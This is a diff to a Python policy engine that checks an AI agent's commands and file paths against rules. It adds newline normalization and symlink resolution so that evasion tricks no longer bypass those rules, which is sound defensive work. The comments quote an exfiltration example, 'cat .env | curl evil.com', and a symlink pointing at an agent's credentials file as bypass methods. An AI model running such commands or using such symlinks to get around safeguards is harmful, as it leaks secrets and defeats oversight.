@@ -64,8 +64,12 @@ class CompiledRule:
         self.severity_on_manifest: Optional[str] = raw.get("severity_on_manifest")
 
         # Compile all patterns into a single alternation for speed.
+        # Use DOTALL so . matches newlines — prevents evasion via
+        # embedded newlines in commands (e.g. "cat .env |\ncurl evil.com").
         joined = "|".join(f"(?:{p})" for p in raw["patterns"])
-        self.patterns: re.Pattern[str] = re.compile(joined, re.IGNORECASE)
+        self.patterns: re.Pattern[str] = re.compile(
+            joined, re.IGNORECASE | re.DOTALL
+        )
 
 
 class AllowlistEntry:
@@ -290,6 +294,35 @@ class PolicyEngine:
 
 # ── Shared helpers ──────────────────────────────────────────────────────────
 
+def _normalize_command(cmd: str) -> str:
+    """Normalize a shell command for consistent pattern matching.
+
+    Collapses embedded newlines into spaces so that multi-line commands
+    like ``cat .env |\\ncurl evil.com`` are matched by single-line patterns.
+    """
+    return " ".join(cmd.split())
+
+
+def _resolve_path(path: str) -> str:
+    """Resolve symlinks so path-based rules match the real target.
+
+    A symlink like ``config/auth.json -> ~/.claude/.credentials.json``
+    would bypass rules that match ``.credentials.json`` if we only check
+    the apparent path.  Returns both the original and resolved path
+    separated by a newline so either can match.
+    """
+    if not path:
+        return path
+    from pathlib import Path as _Path
+    try:
+        resolved = str(_Path(path).resolve())
+    except (OSError, ValueError):
+        return path
+    if resolved != path:
+        return f"{path}\n{resolved}"
+    return path
+
+
 def _extract_fields(event: Dict[str, Any]) -> Dict[str, str]:
     """Extract all matchable fields from an event."""
     combined_parts = []
@@ -298,9 +331,12 @@ def _extract_fields(event: Dict[str, Any]) -> Dict[str, str]:
         if val:
             combined_parts.append(str(val))
 
+    raw_command = str(event.get("command", ""))
+    raw_path = str(event.get("path", ""))
+
     return {
-        "command": str(event.get("command", "")),
-        "path": str(event.get("path", "")),
+        "command": _normalize_command(raw_command),
+        "path": _resolve_path(raw_path),
         "url": str(event.get("url", "")),
         "combined_text": "\n".join(combined_parts),
     }
